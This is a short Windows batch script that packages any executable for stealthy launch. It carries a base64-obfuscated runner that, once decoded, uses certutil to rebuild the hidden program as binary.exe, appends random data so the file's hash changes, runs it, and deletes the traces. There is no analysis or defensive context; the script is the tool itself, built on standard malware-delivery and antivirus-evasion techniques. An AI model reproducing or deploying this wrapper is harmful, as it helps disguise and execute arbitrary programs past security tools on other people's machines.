@echo off

rem core is a base64 encoded string
set core=QGVjaG8gb2ZmCmRpci9ifGZpbmRzdHIgImJpbmFyeS4iID4gZm4udHh0CmZvciAvZiAiZGVsaW1zPSIgJSV4IGluIChmbi50eHQpIGRvIGNlcnR1dGlsIC1kZWNvZGUgJSV4IGJpbmFyeS5leGUKZWNobyAlcmFuZG9tJSA+PiBiaW5hcnkuZXhlCmJpbmFyeS5leGUKY21kIC9jIGRlbCBmbi50eHQKY21kIC9jIGRlbCBiaW5hcnkuZXhlCg==
mkdir %2
echo %core% > runner.tmp
certutil -decode runner.tmp %2\run.cmd
echo rem %random% >> %2\run.cmd
certutil -encode %1 %2\binary.%random%
del runner.tmp